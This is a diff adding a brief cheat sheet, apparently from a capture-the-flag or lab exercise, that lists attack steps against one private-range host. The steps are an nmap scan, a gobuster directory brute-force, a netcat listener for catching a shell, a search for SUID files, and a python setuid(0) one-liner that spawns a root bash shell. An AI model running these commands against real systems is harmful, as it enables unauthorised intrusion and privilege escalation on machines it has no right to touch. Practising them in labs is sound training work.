@@ -1,0 +1,18 @@
+nMap port scan
+nmap -sV -sC 10.49.182.150 -oN nmap.txt
+
+gobuster subdirectories finding
+gobuster -u http://10.49.182.150 -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
+
+Listener
+nc -lvnp 9091
+
+shell commands
+whoami, id
+
+getting way for privEsc
+sudo -l
+find / -user root -perm / 4000
+
+privEsc
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
